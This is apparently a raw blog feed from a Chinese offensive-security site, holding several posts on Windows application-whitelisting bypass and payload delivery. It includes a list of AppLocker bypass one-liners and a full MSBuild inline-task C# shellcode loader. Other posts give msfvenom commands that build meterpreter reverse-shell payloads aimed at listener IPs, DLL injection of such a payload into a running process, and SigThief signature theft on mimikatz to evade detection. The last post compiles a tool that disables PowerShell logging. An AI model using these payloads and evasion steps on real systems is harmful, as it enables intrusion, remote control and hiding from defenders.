rel="noopener">https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/</a></p><h2 id="odbcconf-exe"><a href="#odbcconf-exe" class="headerlink" title="odbcconf.exe"></a>odbcconf.exe</h2><p><code>odbcconf -f file.rsp</code></p><p>Requires admin: ?</p><p>Notes:</p><p>Links:<br><a href="https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b" target="_blank" rel="noopener">https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b</a></p><h2 id="te-exe"><a href="#te-exe" class="headerlink" title="te.exe"></a>te.exe</h2><p><code>te.exe bypass.wsc</code></p><p>Requires admin: No</p><p>Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted.<br>Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF</p><p>Links:<br><a href="https://twitter.com/gN3mes1s/status/927680266390384640" target="_blank" rel="noopener">https://twitter.com/gN3mes1s/status/927680266390384640</a><br><a href="https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42" target="_blank" rel="noopener">https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42</a></p><h2 id="Placing-files-in-writeable-paths-under-c-windows"><a href="#Placing-files-in-writeable-paths-under-c-windows" class="headerlink" title="Placing files in writeable paths under c:\windows"></a>Placing files in writeable paths under c:\windows</h2><p>The following folders are by default writable and executable by normal users<br><code>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</code><br><code>C:\Windows\System32\spool\drivers\color</code><br><code>C:\Windows\Tasks</code><br><code>C:\windows\tracing</code></p><p>Requires admin: No</p><p>Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions</p><h2 id="Atbroker-exe"><a href="#Atbroker-exe" class="headerlink" title="Atbroker.exe"></a>Atbroker.exe</h2><p><code>ATBroker.exe /start malware</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/</a></p><h2 id="WMIC-exe"><a href="#WMIC-exe" class="headerlink" title="WMIC.exe"></a>WMIC.exe</h2><p><code>wmic process call create calc</code></p><p>Requires admin: No</p><p>Notes: </p><p>Links:<br><a href="https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory" target="_blank" rel="noopener">https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory</a></p><h2 id="MavInject32-exe"><a href="#MavInject32-exe" class="headerlink" title="MavInject32.exe"></a>MavInject32.exe</h2><p><code>MavInject32.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code></p><p>Requires admin: No</p><p>Notes: </p><p>Links:<br><a href="https://twitter.com/gN3mes1s/status/941315826107510784" target="_blank" rel="noopener">https://twitter.com/gN3mes1s/status/941315826107510784</a><br><a href="https://twitter.com/Hexacorn/status/776122138063409152" target="_blank" rel="noopener">https://twitter.com/Hexacorn/status/776122138063409152</a></p><h1 id="Bypass-DLL-Default-AppLocker-Rules"><a href="#Bypass-DLL-Default-AppLocker-Rules" class="headerlink" title="Bypass DLL Default AppLocker Rules"></a>Bypass DLL Default AppLocker Rules</h1><p>The goal of this list is document a verified list of known bypasses using AppLocker Default Rules for DLL whitelisting.<br>Please contribute and do point out errors or resources I have forgotten.</p><h2 id="Msbuild-exe-1"><a href="#Msbuild-exe-1" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p><code>msbuild.exe pshell.xml</code></p><p>Requires admin: No</p><p>Notes:</p><p>Links:<br><a href="https://github.com/Cn33liz/MSBuildShell" target="_blank" rel="noopener">https://github.com/Cn33liz/MSBuildShell</a><br><a href="https://github.com/Cn33liz/MS17-012" target="_blank" rel="noopener">https://github.com/Cn33liz/MS17-012</a><br><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br><a href="https://www.youtube.com/watch?v=aSDEAPXaz28" target="_blank" rel="noopener">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/maxresdfault.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="每日安全干货及动态" scheme="www.ggsec.cn/categories/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81/"/>
    
    
  </entry>
  
  <entry>
    <title>GreatSCT | MSF  | 白名单</title>
    <link href="www.ggsec.cn/GreatSCT.html"/>
    <id>www.ggsec.cn/GreatSCT.html</id>
    <published>2018-01-04T11:32:19.000Z</published>
    <updated>2018-01-04T12:38:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/C748EF6C45A33504B55D8087C89D45BA.png" alt="enter description here"><br><a id="more"></a><br>Github <a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">https://github.com/GreatSCT/GreatSCT</a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/GreatSCT.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Casey Smith 发现了一个名为“msbuild.exe”的微软二进制文件。他在2016年9月13日星期二写了一篇博客，标题为“使用MSBuild.exe绕过应用程序白名单 - 设备保护示例和缓解措施”。他的博客已经不存在了，但是你可以在这里通过archive.org访问它 <a href="https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html" target="_blank" rel="noopener">https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html</a></p><h2 id="2-POC-code"><a href="#2-POC-code" class="headerlink" title="2.POC  -code"></a>2.POC  -code</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;Project ToolsVersion=<span class="string">"4.0"</span> xmlns=<span class="string">"http://schemas.microsoft.com/developer/msbuild/2003"</span>&gt;</span><br><span class="line">         &lt;!-- This inline task executes shellcode. --&gt;</span><br><span class="line">         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\msbuild<span class="selector-class">.exe</span> SimpleTasks<span class="selector-class">.csproj</span> --&gt;</span><br><span class="line">         &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span><br><span class="line">         &lt;!-- License: BSD <span class="number">3</span>-Clause --&gt;</span><br><span class="line">  &lt;Target Name=<span class="string">"Hello"</span>&gt;</span><br><span class="line">    &lt;ClassExample /&gt;</span><br><span class="line">  &lt;/Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName=<span class="string">"ClassExample"</span></span><br><span class="line">    TaskFactory=<span class="string">"CodeTaskFactory"</span></span><br><span class="line">    AssemblyFile=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"</span> &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type=<span class="string">"Class"</span> Language=<span class="string">"cs"</span>&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using Microsoft.Build.Framework;</span><br><span class="line">using Microsoft.Build.Utilities;</span><br><span class="line">public class ClassExample :  Task, ITask</span><br><span class="line">&#123;         </span><br><span class="line">  private static UInt32 MEM_COMMIT = 0x1000;          </span><br><span class="line">  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          </span><br><span class="line">  [DllImport(<span class="string">"kernel32"</span>)]</span><br><span class="line">    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">  [DllImport(<span class="string">"kernel32"</span>)]</span><br><span class="line">    private static extern IntPtr CreateThread(            </span><br><span class="line">    UInt32 lpThreadAttributes,</span><br><span class="line">    UInt32 dwStackSize,</span><br><span class="line">    UInt32 lpStartAddress,</span><br><span class="line">    IntPtr param,</span><br><span class="line">    UInt32 dwCreationFlags,</span><br><span class="line">    ref UInt32 lpThreadId           </span><br><span class="line">    );</span><br><span class="line">  [DllImport(<span class="string">"kernel32"</span>)]</span><br><span class="line">    private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">    IntPtr hHandle,</span><br><span class="line">    UInt32 dwMilliseconds</span><br><span class="line">    );          </span><br><span class="line">  public override bool Execute()</span><br><span class="line">  &#123;</span><br><span class="line">    byte[] shellcode = new byte[] &#123; INSERT_SHELLCODE_HERE &#125;;</span><br><span class="line">      </span><br><span class="line">      UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode<span class="selector-class">.Length</span>,</span><br><span class="line">MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">      IntPtr hThread = IntPtr.Zero;</span><br><span class="line">      UInt32 threadId = 0;</span><br><span class="line">      IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">      WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">      return true;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">  &lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure><h2 id="3-怎么运行的"><a href="#3-怎么运行的" class="headerlink" title="3.怎么运行的"></a>3.怎么运行的</h2><p>这是Casey的博客文章的直接引用。这很简单，“msbuild.exe”会为你运行C＃代码。<br>事实证明，MSBuild.exe有一个内置的功能，称为“内联任务”。这些是可以用来丰富C＃构建过程的C＃代码片段。  本质上，这是做一个XML文件，在目标的内存中编译和执行，所以它不是传统的图像/模块执行事件。</p><h2 id="4-MSF-amp-MSBuild-exe"><a href="#4-MSF-amp-MSBuild-exe" class="headerlink" title="4.MSF &amp; MSBuild.exe"></a>4.MSF &amp; MSBuild.exe</h2><p>使用metasploit通过以下命令生成C＃shellcode：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x86 –platform windows -<span class="selector-tag">p</span> windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span>.<span class="number">1.1</span> LPORT=<span class="number">443</span> -f csharp</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/msbuild_shellcode.png" alt="enter description here"></p><p>在msfconsole中启动你的metasploit监听器。将您的“msbuild.exe”xml文件复制到目标系统。就我而言，这是Windows 10 Enterprise。使用以下命令执行有效内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\MSBuild<span class="selector-class">.exe</span> shellcode.xml”.</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1515068611515.jpg" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1515068637863.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="5-自动化生成PAYLOAD"><a href="#5-自动化生成PAYLOAD" class="headerlink" title="5.自动化生成PAYLOAD"></a>5.自动化生成PAYLOAD</h2><p>我们将使用GreatSCT来生成一个“msbuild.exe”有效载荷。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/GreatSCT/GreatSCT.git</span></span><br><span class="line">cd GreatSCT</span><br><span class="line">python3 ./gr8sct.py</span><br></pre></td></tr></table></figure></p><p>&nbsp;<br>按任意键开始<br><img src="http://ojg8j426f.bkt.clouddn.com/1515068898960.jpg" alt="enter description here"><br>&nbsp;<br>选择选项编号“0”，然后按回车。<br><img src="http://ojg8j426f.bkt.clouddn.com/greatsct_msbuild_select.png" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1515069148854.jpg" alt="enter description here"><br>填写 IP</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1515069394562.jpg" alt="enter description here"><br>得到会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1515068637863.jpg" alt="enter description here"><br>原文链接 ：<a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/" target="_blank" rel="noopener">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/C748EF6C45A33504B55D8087C89D45BA.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>CL_Invocation | Powershell</title>
    <link href="www.ggsec.cn/CL-Invocation.html"/>
    <id>www.ggsec.cn/CL-Invocation.html</id>
    <published>2018-01-03T11:11:25.000Z</published>
    <updated>2018-01-09T10:04:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/87953097C158F451293961F5D7311FB6.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/CL_Invocation.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-AuthenticodeSignature C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1</span><br><span class="line">. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1</span><br><span class="line">SyncInvoke  calc.exe</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/88B505CC0D3741C9637F5425E946920F.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/87953097C158F451293961F5D7311FB6.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Linux_Privilege_Escalation_Exploit</title>
    <link href="www.ggsec.cn/Linux-Privilege-Escalation-Exploit.html"/>
    <id>www.ggsec.cn/Linux-Privilege-Escalation-Exploit.html</id>
    <published>2018-01-03T10:43:49.000Z</published>
    <updated>2018-01-03T11:12:53.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/4A5639C6FA9AEB5050270C566CE106AC.png" alt="enter description here"><br><a id="more"></a><br>Linux内核&lt;4.4.0-83/&lt;4.8.0-58（Ubuntu 14.04 / 16.04） - 特权升级漏洞<br><a href="https://0day.today/exploit/29351" target="_blank" rel="noopener">https://0day.today/exploit/29351</a><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/EBB6E91EE3D5215DF59A2F5FC6542B4B.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Linux_Privilege_Escalation_Exploit.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/4A5639C6FA9AEB5050270C566CE106AC.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="www.ggsec.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="www.ggsec.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>数字签名Sigthief |  MSF</title>
    <link href="www.ggsec.cn/sigthief.html"/>
    <id>www.ggsec.cn/sigthief.html</id>
    <published>2018-01-02T13:29:00.000Z</published>
    <updated>2018-01-03T00:23:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/DCFB5158BC5825B8D1A647230F20737C.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/sigthief.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></p><p>Sigthief是劫持合法的数字签名并绕过Windows的哈希验证机制可以被红队用于将恶意二进制文件和PowerShell脚本与本机操作系统文件混合，以逃避检测并绕过设备防护。</p><h2 id="1-首先是Github上的实例-："><a href="#1-首先是Github上的实例-：" class="headerlink" title="1.首先是Github上的实例 ："></a>1.首先是Github上的实例 ：</h2><p>  从一个二进制签名，并将其添加到另一个二进制文件</p><p>  python sigthief.py -i  c:\Windows\System32\consent.exe -t mimikatz.exe -o mimi.exe</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1514901579265.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="2-借用MSF的payload"><a href="#2-借用MSF的payload" class="headerlink" title="2.借用MSF的payload"></a>2.借用MSF的payload</h2><p><img src="http://ojg8j426f.bkt.clouddn.com/1514903647678.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1514903672985.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1514903726663.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="3-签名"><a href="#3-签名" class="headerlink" title="3.签名"></a>3.签名</h2><p><img src="http://ojg8j426f.bkt.clouddn.com/1514903890073.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/DCFB5158BC5825B8D1A647230F20737C.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Stage-RemoteDll | powershell -DLL-MSF</title>
    <link href="www.ggsec.cn/Stage-RemoteDll.html"/>
    <id>www.ggsec.cn/Stage-RemoteDll.html</id>
    <published>2017-12-30T13:00:46.000Z</published>
    <updated>2017-12-30T13:40:01.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/7AFAE845AAE84FF4B3F4659498B3C037.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Stage-RemoteDll.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Github  https://github.com/FuzzySecurity/PowerShell-Suite/edit/master/Stage-RemoteDll.ps1</span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>DLL注入基本上是将代码插入/注入正在运行的进程的过程。我们注入的代码是以动态链接库（DLL）的形式。为什么？运行时需要根据需要加载DLL（如UNIX中的共享库）。在这个项目中，我将只使用DLL，但是我们实际上可以用许多其他的形式（任何PE文件，shellcode /程序集等）来注入代码，正如在恶意软件中常见的那样。</p><p>另外，请记住，您需要具有适当级别的权限才能开始播放其他进程的内存。但是，我不会谈论受保护的进程和Windows 特权级别（在Vista中引入）。这是一个完全不同的主题。</p><p>同样，正如我上面所说，DLL注入可以用于合法的目的。例如，防病毒和端点安全解决方案使用这些技术将自己的软件代码/钩子放入系统上的所有正在运行的进程中。这使得他们能够在运行过程中监控每个流程，更好地保护我们。也有恶意的目的。通常使用的常用技术是注入“lsass”进程以获取密码哈希值。我们都做到了。期。显然，恶意软件也广泛使用代码注入技术。要么运行shellcode，运行PE文件，要么将DLL加载到另一个进程的内存中以隐藏自身等等。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>我们将为每种技术使用MS Windows API，因为它提供了相当多的功能，允许我们附加和操作其他进程。从操作系统的第一个版本开始，DLL一直是MS Windows的基石。实际上，MS Windows API中的所有功能都包含DLL。一些最重要的是“Kernel32.dll”（包含用于管理内存，进程和线程的函数），“User32.dll”（主要是用户界面函数）和“GDI32.dll”文本显示）。</p><p>您可能想知道为什么这样的API存在，为什么微软会给我们这样一个很好的功能来播放和混淆其他进程的内存呢？主要原因是扩展应用程序的功能。例如，一个公司创建一个应用程序，并希望允许其他公司扩展或增强应用程序。所以是的，它有一个合法的使用目的。此外，DLL对于项目管理，保存内存，资源共享等都非常有用。</p><p>下图试图说明几乎每个DLL注入技术的流程。</p><p><img src="http://ojg8j426f.bkt.clouddn.com/diagram.png" alt="enter description here"></p><p>原文链接：<a href="http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/" target="_blank" rel="noopener">http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/</a></p><p>废话不多说 推主发了这个图 ，正好我想复现这个<br><img src="http://ojg8j426f.bkt.clouddn.com/DMmR5z_W4AAN0_E.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>使用MSF 生成dll<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll &gt;demon.dll</span><br></pre></td></tr></table></figure></p><p>&nbsp;<br>启动MSF 监听<br><img src="http://ojg8j426f.bkt.clouddn.com/1514640392133.jpg" alt="enter description here"><br>msfconsole -r handler.rc </p><p>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1514640345929.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>执行PAYLOAD<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-Process notepad  (获取某个进程 )</span><br><span class="line">Import-Module .\Stage-RemoteDll.ps1   (导入远程dll 模块 )</span><br><span class="line">Stage-RemoteDll -ProcID 8208 -DllPath .\demon.dll -Mode QueueUserAPC  -Verbose  (进行dll 注入)</span><br></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1514641182460.jpg" alt="enter description here"><br>最终得到会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1514640573025.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/7AFAE845AAE84FF4B3F4659498B3C037.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>每日安全干货及动态</title>
    <link href="www.ggsec.cn/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81.html"/>
    <id>www.ggsec.cn/每日安全干货及动态.html</id>
    <published>2017-12-29T11:10:28.000Z</published>
    <updated>2017-12-29T11:48:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/82260D1294C5293BF83750DE949303D3.png" alt="enter description here"></p><a id="more"></a><h2 id="1-subTee的代码备份"><a href="#1-subTee的代码备份" class="headerlink" title="1.subTee的代码备份 "></a>1.<span style="color: #339966;">subTee的代码备份 </span></h2><p><a href="https://github.com/re4lity/subTee-gits-backups.git" target="_blank" rel="noopener">https://github.com/re4lity/subTee-gits-backups.git</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/0EA4233993FBF51E2348DF59BEAE8008.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="2-禁用PS日志记录"><a href="#2-禁用PS日志记录" class="headerlink" title="2.禁用PS日志记录  "></a>2.<span style="color: #339966;">禁用PS日志记录  </span></h2><p><a href="https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs" target="_blank" rel="noopener">https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs</a><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe DisablePSLogging.cs /reference:c:\Windows\assembly\GAC<span class="emphasis">_MSIL\System.Management.Automation\1.0.0.0_</span>_31bf3856ad364e35\System.Management.Automation.dll</span><br><span class="line">DisablePSLogging.exe</span><br></pre></td></tr></table></figure></p><p><img 